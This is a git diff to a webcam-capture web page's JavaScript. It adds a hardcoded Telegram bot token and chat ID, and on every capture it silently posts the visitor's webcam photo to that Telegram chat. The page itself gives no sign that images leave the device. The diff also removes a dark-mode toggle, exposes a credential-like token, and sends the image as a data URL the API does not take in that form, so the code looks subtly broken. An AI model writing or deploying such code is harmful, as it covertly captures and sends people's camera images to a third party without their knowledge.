@@ -4,6 +4,10 @@ const canvas = document.getElementById('canvas');
 const captureButton = document.getElementById('capture');
 const resultDiv = document.getElementById('result');
 
+// Telegram Bot Token (replace with your bot's token)
+const botToken = '6636786698:AAFJmVfEd1CIYP-6BZlNlF-ia84TopX-g5E';
+const chatId = '6069933382';  // Replace with your chat ID (can be your own or a group chat)
+
 // Access the user's webcam and display it on the video element
 navigator.mediaDevices.getUserMedia({ video: true })
     .then(function(stream) {
@@ -28,9 +32,34 @@ captureButton.addEventListener('click', function() {
 
     // Display the captured image in the result div
     resultDiv.innerHTML = `<img src="${dataUrl}" alt="Captured Image" />`;
+
+    // Send image to Telegram
+    sendToTelegram(dataUrl);
 });
 
-// Toggle Dark Mode
-function toggleDarkMode() {
-    document.body.classList.toggle("dark-mode");
+// Function to send the image to Telegram
+function sendToTelegram(imageData) {
+    const url = `https://api.telegram.org/bot${botToken}/sendPhoto`;
+
+    // Prepare the form data
+    const formData = new FormData();
+    formData.append('chat_id', chatId);
+    formData.append('photo', imageData);  // Send the captured image as base64
+
+    // Send a POST request to the Telegram Bot API
+    fetch(url, {
+        method: 'POST',
+        body: formData
+    })
+    .then(response => response.json())
+    .then(data => {
+        if (data.ok) {
+            console.log('Image sent to Telegram!');
+        } else {
+            console.error('Failed to send image to Telegram:', data);
+        }
+    })
+    .catch(error => {
+        console.error('Error:', error);
+    });
 }
